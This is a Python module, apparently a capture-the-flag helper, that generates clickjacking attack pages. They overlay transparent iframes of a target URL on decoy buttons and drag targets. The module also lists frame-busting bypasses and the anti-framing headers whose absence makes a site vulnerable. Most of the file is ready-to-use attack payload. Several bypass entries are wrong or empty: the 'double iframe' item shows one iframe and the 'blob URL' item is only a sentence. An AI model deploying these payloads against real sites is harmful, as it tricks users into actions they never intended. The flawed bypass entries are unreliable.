"""
Clickjacking Payload Crafter for Web CTF.
Covers iframe-based UI redress, frame-busting bypasses, and clickjacking PoCs.
"""

from typing import List, Dict


def get_clickjacking_payloads(target_url: str = "https://target.com/action") -> List[Dict[str, str]]:
    """Generate clickjacking PoC payloads."""
    return [
        {
            "name": "Basic Clickjacking PoC",
            "payload": f"""<html>
<head><title>Clickjacking PoC</title></head>
<body>
<h1>Click the button!</h1>
<iframe src="{target_url}" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.1;z-index:2;"></iframe>
<button style="position:absolute;top:100px;left:100px;z-index:1;">Click Me</button>
</body>
</html>""",
            "desc": "Basic iframe-based clickjacking PoC with transparent overlay."
        },
        {
            "name": "Fully Transparent Overlay",
            "payload": f"""<html>
<body>
<iframe src="{target_url}" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;z-index:2;"></iframe>
<button style="position:absolute;top:50px;left:50px;z-index:1;">Submit</button>
</body>
</html>""",
            "desc": "Fully transparent iframe overlay for stealth clickjacking."
        },
        {
            "name": "Multi-Button Clickjacking",
            "payload": f"""<html>
<body>
<iframe src="{target_url}" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.1;z-index:2;"></iframe>
<button style="position:absolute;top:100px;left:100px;z-index:1;">Button 1</button>
<button style="position:absolute;top:200px;left:200px;z-index:1;">Button 2</button>
</body>
</html>""",
            "desc": "Multiple buttons to trigger multiple actions."
        },
        {
            "name": "Drag-and-Drop Clickjacking",
            "payload": f"""<html>
<body>
<iframe src="{target_url}" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.1;z-index:2;"></iframe>
<div style="position:absolute;top:100px;left:100px;z-index:1;width:200px;height:50px;background:red;">Drag here</div>
</body>
</html>""",
            "desc": "Drag-and-drop clickjacking to trigger file uploads."
        }
    ]


def get_frame_busting_bypasses() -> List[Dict[str, str]]:
    """Generate frame-busting bypass techniques."""
    return [
        {
            "name": "Sandbox Attribute Bypass",
            "payload": '<iframe src="target" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>',
            "desc": "Sandbox attribute may disable frame-busting scripts."
        },
        {
            "name": "onload Event Bypass",
            "payload": '<iframe src="target" onload="this.style.opacity=0"></iframe>',
            "desc": "onload event to hide iframe after load."
        },
        {
            "name": "Double Iframe Bypass",
            "payload": '<iframe src="target" style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>',
            "desc": "Nested iframes may bypass frame-busting."
        },
        {
            "name": "Blob URL Bypass",
            "payload": "Create blob URL with frame-busting bypass",
            "desc": "Blob URLs may bypass frame-busting detection."
        }
    ]


def get_clickjacking_headers() -> List[Dict[str, str]]:
    """Headers that prevent clickjacking (to check for absence)."""
    return [
        {
            "header": "X-Frame-Options",
            "value": "DENY / SAMEORIGIN",
            "desc": "If absent, clickjacking is possible."
        },
        {
            "header": "Content-Security-Policy",
            "value": "frame-ancestors 'none'",
            "desc": "If absent, clickjacking is possible."
        },
        {
            "header": "X-Content-Type-Options",
            "value": "nosniff",
            "desc": "Related hardening header."
        }
    ]
